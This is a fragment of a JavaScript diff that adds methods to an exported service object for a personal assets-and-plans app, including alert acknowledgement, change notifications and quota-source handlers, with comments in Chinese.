+    upsertAsset,
+    upsertPlan,
+    upsertTodo,
+    upsertDebt,
+    removeAsset,
+    removePlan,
+    removeTodo,
+    removeDebt,
+    setPlanCredential,
+    setPlanWindows,
+    refreshQuota,
+    registerKind,
+    updateSettings,
+    syncReminders,
+    ackAlert(id) {
+      const rec = alerts.ack(id);
+      if (!rec) return fail(`提醒 ${id} 不存在`);
+      hooks?.onDataChanged?.('alerts');
+      return done({ alert: rec });
+    },
+    ackAllAlerts() {
+      const count = alerts.ackAll();
+      hooks?.onDataChanged?.('alerts');
+      return done({ acknowledged: count });
+    },
+    /** 提醒引擎/额度引擎写库后由 index.js 调回来的通知 */
+    notifyChanged(reason) {
+      alerts.recompute();
+      hooks?.onDataChanged?.(reason);
+    },
+
+    /* 额度源（模型可写） */
+    listSources,
+    testSource,
+    saveSource,
+    deleteSource,
+  };
+}
+
+export { isValidIso, normalizeAlert };
